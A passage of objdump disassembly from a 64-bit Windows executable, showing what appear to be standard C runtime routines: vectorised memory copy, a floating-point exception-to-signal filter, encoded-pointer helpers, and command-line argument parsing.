   1400034d6:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   1400034dd:	00 
   1400034de:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   1400034e5:	00 
   1400034e6:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   1400034ed:	00 
   1400034ee:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   1400034f5:	00 
   1400034f6:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   1400034fd:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   140003504:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000350b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   140003512:	0f 83 78 ff ff ff    	jae    0x140003490
   140003518:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000351c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   140003520:	4d 8b d9             	mov    %r9,%r11
   140003523:	49 c1 eb 05          	shr    $0x5,%r11
   140003527:	47 8b 9c 9a b4 a0 01 	mov    0x1a0b4(%r10,%r11,4),%r11d
   14000352e:	00 
   14000352f:	4d 03 da             	add    %r10,%r11
   140003532:	41 ff e3             	jmp    *%r11
   140003535:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000353c:	ff ff ff 
   14000353f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   140003546:	ff ff ff 
   140003549:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   140003550:	ff ff ff 
   140003553:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   14000355a:	ff ff ff 
   14000355d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   140003564:	ff ff ff 
   140003567:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   14000356e:	ff ff ff 
   140003571:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   140003578:	ff ff ff 
   14000357b:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   140003582:	ff ff ff 
   140003585:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000358c:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   140003593:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000359a:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   1400035a1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   1400035a8:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   1400035af:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   1400035b6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   1400035ba:	0f ae f8             	sfence
   1400035bd:	c5 f8 77             	vzeroupper
   1400035c0:	c3                   	ret
   1400035c1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400035c8:	0f 1f 84 00 00 00 00 
   1400035cf:	00 
   1400035d0:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   1400035d7:	76 0d                	jbe    0x1400035e6
   1400035d9:	f6 05 d0 44 01 00 02 	testb  $0x2,0x144d0(%rip)        # 0x140017ab0
   1400035e0:	0f 85 8a fb ff ff    	jne    0x140003170
   1400035e6:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   1400035ea:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   1400035f1:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400035f8:	0f 86 8e 00 00 00    	jbe    0x14000368c
   1400035fe:	4c 8b c9             	mov    %rcx,%r9
   140003601:	49 83 e1 0f          	and    $0xf,%r9
   140003605:	49 83 e9 10          	sub    $0x10,%r9
   140003609:	49 2b c9             	sub    %r9,%rcx
   14000360c:	49 2b d1             	sub    %r9,%rdx
   14000360f:	4d 03 c1             	add    %r9,%r8
   140003612:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   140003619:	76 71                	jbe    0x14000368c
   14000361b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003620:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   140003624:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   140003629:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   14000362e:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   140003633:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   140003637:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   14000363c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   140003641:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   140003646:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   14000364b:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   140003650:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   140003655:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   14000365a:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   14000365f:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   140003664:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   140003669:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   14000366e:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140003675:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   14000367c:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   140003683:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000368a:	73 94                	jae    0x140003620
   14000368c:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140003690:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140003694:	4d 8b d9             	mov    %r9,%r11
   140003697:	49 c1 eb 04          	shr    $0x4,%r11
   14000369b:	47 8b 9c 9a d8 a0 01 	mov    0x1a0d8(%r10,%r11,4),%r11d
   1400036a2:	00 
   1400036a3:	4d 03 da             	add    %r10,%r11
   1400036a6:	41 ff e3             	jmp    *%r11
   1400036a9:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   1400036b0:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   1400036b7:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   1400036be:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   1400036c5:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   1400036cc:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   1400036d3:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   1400036da:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   1400036e1:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   1400036e8:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   1400036ef:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   1400036f6:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   1400036fd:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   140003704:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   14000370b:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   140003712:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140003716:	c3                   	ret
   140003717:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000371e:	00 00 
   140003720:	4c 8b d9             	mov    %rcx,%r11
   140003723:	4c 8b d2             	mov    %rdx,%r10
   140003726:	48 2b d1             	sub    %rcx,%rdx
   140003729:	49 03 c8             	add    %r8,%rcx
   14000372c:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140003731:	48 83 e9 10          	sub    $0x10,%rcx
   140003735:	49 83 e8 10          	sub    $0x10,%r8
   140003739:	f6 c1 0f             	test   $0xf,%cl
   14000373c:	74 17                	je     0x140003755
   14000373e:	48 8b c1             	mov    %rcx,%rax
   140003741:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140003745:	0f 10 c8             	movups %xmm0,%xmm1
   140003748:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000374c:	0f 11 08             	movups %xmm1,(%rax)
   14000374f:	4c 8b c1             	mov    %rcx,%r8
   140003752:	4d 2b c3             	sub    %r11,%r8
   140003755:	4d 8b c8             	mov    %r8,%r9
   140003758:	49 c1 e9 07          	shr    $0x7,%r9
   14000375c:	74 6f                	je     0x1400037cd
   14000375e:	0f 29 01             	movaps %xmm0,(%rcx)
   140003761:	eb 14                	jmp    0x140003777
   140003763:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000376a:	84 00 00 00 00 00 
   140003770:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140003774:	0f 29 09             	movaps %xmm1,(%rcx)
   140003777:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000377c:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   140003781:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140003788:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000378c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   140003790:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   140003795:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000379a:	49 ff c9             	dec    %r9
   14000379d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   1400037a1:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   1400037a5:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
   1400037aa:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   1400037af:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   1400037b3:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   1400037b7:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   1400037bc:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   1400037c0:	75 ae                	jne    0x140003770
   1400037c2:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1400037c6:	49 83 e0 7f          	and    $0x7f,%r8
   1400037ca:	0f 28 c1             	movaps %xmm1,%xmm0
   1400037cd:	4d 8b c8             	mov    %r8,%r9
   1400037d0:	49 c1 e9 04          	shr    $0x4,%r9
   1400037d4:	74 1a                	je     0x1400037f0
   1400037d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400037dd:	00 00 00 
   1400037e0:	0f 11 01             	movups %xmm0,(%rcx)
   1400037e3:	48 83 e9 10          	sub    $0x10,%rcx
   1400037e7:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   1400037eb:	49 ff c9             	dec    %r9
   1400037ee:	75 f0                	jne    0x1400037e0
   1400037f0:	49 83 e0 0f          	and    $0xf,%r8
   1400037f4:	74 08                	je     0x1400037fe
   1400037f6:	41 0f 10 0a          	movups (%r10),%xmm1
   1400037fa:	41 0f 11 0b          	movups %xmm1,(%r11)
   1400037fe:	0f 11 01             	movups %xmm0,(%rcx)
   140003801:	49 8b c3             	mov    %r11,%rax
   140003804:	c3                   	ret
   140003805:	cc                   	int3
   140003806:	cc                   	int3
   140003807:	cc                   	int3
   140003808:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000380d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003812:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003817:	57                   	push   %rdi
   140003818:	48 83 ec 20          	sub    $0x20,%rsp
   14000381c:	48 8b f2             	mov    %rdx,%rsi
   14000381f:	8b f9                	mov    %ecx,%edi
   140003821:	e8 3a 1b 00 00       	call   0x140005360
   140003826:	45 33 c9             	xor    %r9d,%r9d
   140003829:	48 8b d8             	mov    %rax,%rbx
   14000382c:	48 85 c0             	test   %rax,%rax
   14000382f:	0f 84 3e 01 00 00    	je     0x140003973
   140003835:	48 8b 08             	mov    (%rax),%rcx
   140003838:	48 8b c1             	mov    %rcx,%rax
   14000383b:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   140003842:	49 3b c8             	cmp    %r8,%rcx
   140003845:	74 0d                	je     0x140003854
   140003847:	39 38                	cmp    %edi,(%rax)
   140003849:	74 0c                	je     0x140003857
   14000384b:	48 83 c0 10          	add    $0x10,%rax
   14000384f:	49 3b c0             	cmp    %r8,%rax
   140003852:	75 f3                	jne    0x140003847
   140003854:	49 8b c1             	mov    %r9,%rax
   140003857:	48 85 c0             	test   %rax,%rax
   14000385a:	0f 84 13 01 00 00    	je     0x140003973
   140003860:	4c 8b 40 08          	mov    0x8(%rax),%r8
   140003864:	4d 85 c0             	test   %r8,%r8
   140003867:	0f 84 06 01 00 00    	je     0x140003973
   14000386d:	49 83 f8 05          	cmp    $0x5,%r8
   140003871:	75 0d                	jne    0x140003880
   140003873:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140003877:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   14000387b:	e9 f5 00 00 00       	jmp    0x140003975
   140003880:	49 83 f8 01          	cmp    $0x1,%r8
   140003884:	75 08                	jne    0x14000388e
   140003886:	83 c8 ff             	or     $0xffffffff,%eax
   140003889:	e9 e7 00 00 00       	jmp    0x140003975
   14000388e:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   140003892:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   140003896:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   14000389a:	0f 85 ba 00 00 00    	jne    0x14000395a
   1400038a0:	48 83 c1 30          	add    $0x30,%rcx
   1400038a4:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   1400038ab:	eb 08                	jmp    0x1400038b5
   1400038ad:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   1400038b1:	48 83 c1 10          	add    $0x10,%rcx
   1400038b5:	48 3b ca             	cmp    %rdx,%rcx
   1400038b8:	75 f3                	jne    0x1400038ad
   1400038ba:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   1400038c0:	8b 7b 10             	mov    0x10(%rbx),%edi
   1400038c3:	74 7a                	je     0x14000393f
   1400038c5:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   1400038cb:	74 6b                	je     0x140003938
   1400038cd:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   1400038d3:	74 5c                	je     0x140003931
   1400038d5:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   1400038db:	74 4d                	je     0x14000392a
   1400038dd:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   1400038e3:	74 3e                	je     0x140003923
   1400038e5:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   1400038eb:	74 2f                	je     0x14000391c
   1400038ed:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   1400038f3:	74 20                	je     0x140003915
   1400038f5:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   1400038fb:	74 11                	je     0x14000390e
   1400038fd:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   140003903:	8b d7                	mov    %edi,%edx
   140003905:	75 40                	jne    0x140003947
   140003907:	ba 8d 00 00 00       	mov    $0x8d,%edx
   14000390c:	eb 36                	jmp    0x140003944
   14000390e:	ba 8e 00 00 00       	mov    $0x8e,%edx
   140003913:	eb 2f                	jmp    0x140003944
   140003915:	ba 85 00 00 00       	mov    $0x85,%edx
   14000391a:	eb 28                	jmp    0x140003944
   14000391c:	ba 8a 00 00 00       	mov    $0x8a,%edx
   140003921:	eb 21                	jmp    0x140003944
   140003923:	ba 84 00 00 00       	mov    $0x84,%edx
   140003928:	eb 1a                	jmp    0x140003944
   14000392a:	ba 81 00 00 00       	mov    $0x81,%edx
   14000392f:	eb 13                	jmp    0x140003944
   140003931:	ba 86 00 00 00       	mov    $0x86,%edx
   140003936:	eb 0c                	jmp    0x140003944
   140003938:	ba 83 00 00 00       	mov    $0x83,%edx
   14000393d:	eb 05                	jmp    0x140003944
   14000393f:	ba 82 00 00 00       	mov    $0x82,%edx
   140003944:	89 53 10             	mov    %edx,0x10(%rbx)
   140003947:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000394c:	49 8b c0             	mov    %r8,%rax
   14000394f:	ff 15 e3 a8 00 00    	call   *0xa8e3(%rip)        # 0x14000e238
   140003955:	89 7b 10             	mov    %edi,0x10(%rbx)
   140003958:	eb 10                	jmp    0x14000396a
   14000395a:	8b 48 04             	mov    0x4(%rax),%ecx
   14000395d:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140003961:	49 8b c0             	mov    %r8,%rax
   140003964:	ff 15 ce a8 00 00    	call   *0xa8ce(%rip)        # 0x14000e238
   14000396a:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   14000396e:	e9 13 ff ff ff       	jmp    0x140003886
   140003973:	33 c0                	xor    %eax,%eax
   140003975:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000397a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000397f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003984:	48 83 c4 20          	add    $0x20,%rsp
   140003988:	5f                   	pop    %rdi
   140003989:	c3                   	ret
   14000398a:	cc                   	int3
   14000398b:	cc                   	int3
   14000398c:	8b 05 8e 42 01 00    	mov    0x1428e(%rip),%eax        # 0x140017c20
   140003992:	c3                   	ret
   140003993:	cc                   	int3
   140003994:	89 0d 86 42 01 00    	mov    %ecx,0x14286(%rip)        # 0x140017c20
   14000399a:	c3                   	ret
   14000399b:	cc                   	int3
   14000399c:	48 8b 15 85 36 01 00 	mov    0x13685(%rip),%rdx        # 0x140017028
   1400039a3:	8b ca                	mov    %edx,%ecx
   1400039a5:	48 33 15 7c 42 01 00 	xor    0x1427c(%rip),%rdx        # 0x140017c28
   1400039ac:	83 e1 3f             	and    $0x3f,%ecx
   1400039af:	48 d3 ca             	ror    %cl,%rdx
   1400039b2:	48 85 d2             	test   %rdx,%rdx
   1400039b5:	0f 95 c0             	setne  %al
   1400039b8:	c3                   	ret
   1400039b9:	cc                   	int3
   1400039ba:	cc                   	int3
   1400039bb:	cc                   	int3
   1400039bc:	48 89 0d 65 42 01 00 	mov    %rcx,0x14265(%rip)        # 0x140017c28
   1400039c3:	c3                   	ret
   1400039c4:	48 8b 15 5d 36 01 00 	mov    0x1365d(%rip),%rdx        # 0x140017028
   1400039cb:	4c 8b c1             	mov    %rcx,%r8
   1400039ce:	8b ca                	mov    %edx,%ecx
   1400039d0:	48 33 15 51 42 01 00 	xor    0x14251(%rip),%rdx        # 0x140017c28
   1400039d7:	83 e1 3f             	and    $0x3f,%ecx
   1400039da:	48 d3 ca             	ror    %cl,%rdx
   1400039dd:	48 85 d2             	test   %rdx,%rdx
   1400039e0:	75 03                	jne    0x1400039e5
   1400039e2:	33 c0                	xor    %eax,%eax
   1400039e4:	c3                   	ret
   1400039e5:	49 8b c8             	mov    %r8,%rcx
   1400039e8:	48 8b c2             	mov    %rdx,%rax
   1400039eb:	48 ff 25 46 a8 00 00 	rex.W jmp *0xa846(%rip)        # 0x14000e238
   1400039f2:	cc                   	int3
   1400039f3:	cc                   	int3
   1400039f4:	4c 8b 05 2d 36 01 00 	mov    0x1362d(%rip),%r8        # 0x140017028
   1400039fb:	4c 8b c9             	mov    %rcx,%r9
   1400039fe:	41 8b d0             	mov    %r8d,%edx
   140003a01:	b9 40 00 00 00       	mov    $0x40,%ecx
   140003a06:	83 e2 3f             	and    $0x3f,%edx
   140003a09:	2b ca                	sub    %edx,%ecx
   140003a0b:	49 d3 c9             	ror    %cl,%r9
   140003a0e:	4d 33 c8             	xor    %r8,%r9
   140003a11:	4c 89 0d 10 42 01 00 	mov    %r9,0x14210(%rip)        # 0x140017c28
   140003a18:	c3                   	ret
   140003a19:	cc                   	int3
   140003a1a:	cc                   	int3
   140003a1b:	cc                   	int3
   140003a1c:	48 8b c4             	mov    %rsp,%rax
   140003a1f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003a23:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140003a27:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003a2b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003a2f:	41 54                	push   %r12
   140003a31:	41 56                	push   %r14
   140003a33:	41 57                	push   %r15
   140003a35:	48 83 ec 20          	sub    $0x20,%rsp
   140003a39:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   140003a3e:	4d 8b e1             	mov    %r9,%r12
   140003a41:	49 8b d8             	mov    %r8,%rbx
   140003a44:	4c 8b f2             	mov    %rdx,%r14
   140003a47:	48 8b f9             	mov    %rcx,%rdi
   140003a4a:	49 83 27 00          	andq   $0x0,(%r15)
   140003a4e:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140003a55:	48 85 d2             	test   %rdx,%rdx
   140003a58:	74 07                	je     0x140003a61
   140003a5a:	48 89 1a             	mov    %rbx,(%rdx)
   140003a5d:	49 83 c6 08          	add    $0x8,%r14
   140003a61:	40 32 ed             	xor    %bpl,%bpl
   140003a64:	80 3f 22             	cmpb   $0x22,(%rdi)
   140003a67:	75 0f                	jne    0x140003a78
   140003a69:	40 84 ed             	test   %bpl,%bpl
   140003a6c:	40 b6 22             	mov    $0x22,%sil
   140003a6f:	40 0f 94 c5          	sete   %bpl
   140003a73:	48 ff c7             	inc    %rdi
   140003a76:	eb 37                	jmp    0x140003aaf
   140003a78:	49 ff 07             	incq   (%r15)
   140003a7b:	48 85 db             	test   %rbx,%rbx
   140003a7e:	74 07                	je     0x140003a87
   140003a80:	8a 07                	mov    (%rdi),%al
   140003a82:	88 03                	mov    %al,(%rbx)
   140003a84:	48 ff c3             	inc    %rbx
   140003a87:	0f be 37             	movsbl (%rdi),%esi
   140003a8a:	48 ff c7             	inc    %rdi
   140003a8d:	8b ce                	mov    %esi,%ecx
   140003a8f:	e8 d4 34 00 00       	call   0x140006f68
   140003a94:	85 c0                	test   %eax,%eax
   140003a96:	74 12                	je     0x140003aaa
   140003a98:	49 ff 07             	incq   (%r15)
   140003a9b:	48 85 db             	test   %rbx,%rbx
   140003a9e:	74 07                	je     0x140003aa7
   140003aa0:	8a 07                	mov    (%rdi),%al
   140003aa2:	88 03                	mov    %al,(%rbx)
   140003aa4:	48 ff c3             	inc    %rbx
   140003aa7:	48 ff c7             	inc    %rdi
   140003aaa:	40 84 f6             	test   %sil,%sil
   140003aad:	74 1c                	je     0x140003acb
   140003aaf:	40 84 ed             	test   %bpl,%bpl
   140003ab2:	75 b0                	jne    0x140003a64
   140003ab4:	40 80 fe 20          	cmp    $0x20,%sil
   140003ab8:	74 06                	je     0x140003ac0
   140003aba:	40 80 fe 09          	cmp    $0x9,%sil
   140003abe:	75 a4                	jne    0x140003a64
   140003ac0:	48 85 db             	test   %rbx,%rbx
   140003ac3:	74 09                	je     0x140003ace
   140003ac5:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   140003ac9:	eb 03                	jmp    0x140003ace
   140003acb:	48 ff cf             	dec    %rdi
   140003ace:	40 32 f6             	xor    %sil,%sil
   140003ad1:	8a 07                	mov    (%rdi),%al
   140003ad3:	84 c0                	test   %al,%al
   140003ad5:	0f 84 d4 00 00 00    	je     0x140003baf
   140003adb:	3c 20                	cmp    $0x20,%al
   140003add:	74 04                	je     0x140003ae3
   140003adf:	3c 09                	cmp    $0x9,%al
   140003ae1:	75 07                	jne    0x140003aea
   140003ae3:	48 ff c7             	inc    %rdi
   140003ae6:	8a 07                	mov    (%rdi),%al
   140003ae8:	eb f1                	jmp    0x140003adb
   140003aea:	84 c0                	test   %al,%al
   140003aec:	0f 84 bd 00 00 00    	je     0x140003baf
   140003af2:	4d 85 f6             	test   %r14,%r14
   140003af5:	74 07                	je     0x140003afe
   140003af7:	49 89 1e             	mov    %rbx,(%r14)
   140003afa:	49 83 c6 08          	add    $0x8,%r14
   140003afe:	49 ff 04 24          	incq   (%r12)
   140003b02:	ba 01 00 00 00       	mov    $0x1,%edx
   140003b07:	33 c0                	xor    %eax,%eax
   140003b09:	eb 05                	jmp    0x140003b10
   140003b0b:	48 ff c7             	inc    %rdi
   140003b0e:	ff c0                	inc    %eax
   140003b10:	8a 0f                	mov    (%rdi),%cl
   140003b12:	80 f9 5c             	cmp    $0x5c,%cl
   140003b15:	74 f4                	je     0x140003b0b
   140003b17:	80 f9 22             	cmp    $0x22,%cl
   140003b1a:	75 30                	jne    0x140003b4c
   140003b1c:	84 c2                	test   %al,%dl
   140003b1e:	75 18                	jne    0x140003b38
   140003b20:	40 84 f6             	test   %sil,%sil
   140003b23:	74 0a                	je     0x140003b2f
   140003b25:	38 4f 01             	cmp    %cl,0x1(%rdi)
   140003b28:	75 05                	jne    0x140003b2f
   140003b2a:	48 ff c7             	inc    %rdi
   140003b2d:	eb 09                	jmp    0x140003b38
   140003b2f:	33 d2                	xor    %edx,%edx
   140003b31:	40 84 f6             	test   %sil,%sil
   140003b34:	40 0f 94 c6          	sete   %sil
   140003b38:	d1 e8                	shr    $1,%eax
   140003b3a:	eb 10                	jmp    0x140003b4c
   140003b3c:	ff c8                	dec    %eax
   140003b3e:	48 85 db             	test   %rbx,%rbx
   140003b41:	74 06                	je     0x140003b49
   140003b43:	c6 03 5c             	movb   $0x5c,(%rbx)
   140003b46:	48 ff c3             	inc    %rbx
   140003b49:	49 ff 07             	incq   (%r15)
   140003b4c:	85 c0                	test   %eax,%eax
   140003b4e:	75 ec                	jne    0x140003b3c
   140003b50:	8a 07                	mov    (%rdi),%al
   140003b52:	84 c0                	test   %al,%al
   140003b54:	74 46                	je     0x140003b9c
   140003b56:	40 84 f6             	test   %sil,%sil
   140003b59:	75 08                	jne    0x140003b63
   140003b5b:	3c 20                	cmp    $0x20,%al
   140003b5d:	74 3d                	je     0x140003b9c
   140003b5f:	3c 09                	cmp    $0x9,%al
   140003b61:	74 39                	je     0x140003b9c
   140003b63:	85 d2                	test   %edx,%edx
   140003b65:	74 2d                	je     0x140003b94
   140003b67:	48 85 db             	test   %rbx,%rbx
   140003b6a:	74 07                	je     0x140003b73
   140003b6c:	88 03                	mov    %al,(%rbx)
   140003b6e:	48 ff c3             	inc    %rbx
   140003b71:	8a 07                	mov    (%rdi),%al
   140003b73:	0f be c8             	movsbl %al,%ecx
   140003b76:	e8 ed 33 00 00       	call   0x140006f68
   140003b7b:	85 c0                	test   %eax,%eax
   140003b7d:	74 12                	je     0x140003b91
   140003b7f:	49 ff 07             	incq   (%r15)
   140003b82:	48 ff c7             	inc    %rdi
   140003b85:	48 85 db             	test   %rbx,%rbx
   140003b88:	74 07                	je     0x140003b91
   140003b8a:	8a 07                	mov    (%rdi),%al
   140003b8c:	88 03                	mov    %al,(%rbx)
   140003b8e:	48 ff c3             	inc    %rbx
   140003b91:	49 ff 07             	incq   (%r15)
   140003b94:	48 ff c7             	inc    %rdi
   140003b97:	e9 66 ff ff ff       	jmp    0x140003b02
   140003b9c:	48 85 db             	test   %rbx,%rbx
   140003b9f:	74 06                	je     0x140003ba7
   140003ba1:	c6 03 00             	movb   $0x0,(%rbx)
   140003ba4:	48 ff c3             	inc    %rbx
   140003ba7:	49 ff 07             	incq   (%r15)
   140003baa:	e9 22 ff ff ff       	jmp    0x140003ad1
   140003baf:	4d 85 f6             	test   %r14,%r14
   140003bb2:	74 04                	je     0x140003bb8
   140003bb4:	49 83 26 00          	andq   $0x0,(%r14)
   140003bb8:	49 ff 04 24          	incq   (%r12)
   140003bbc:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003bc1:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003bc6:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003bcb:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140003bd0:	48 83 c4 20          	add    $0x20,%rsp
   140003bd4:	41 5f                	pop    %r15
   140003bd6:	41 5e                	pop    %r14
   140003bd8:	41 5c                	pop    %r12
   140003bda:	c3                   	ret
   140003bdb:	cc                   	int3
   140003bdc:	40 53                	rex push %rbx
   140003bde:	48 83 ec 20          	sub    $0x20,%rsp
   140003be2:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140003be9:	ff ff 1f 
   140003bec:	4c 8b ca             	mov    %rdx,%r9
   140003bef:	48 3b c8             	cmp    %rax,%rcx
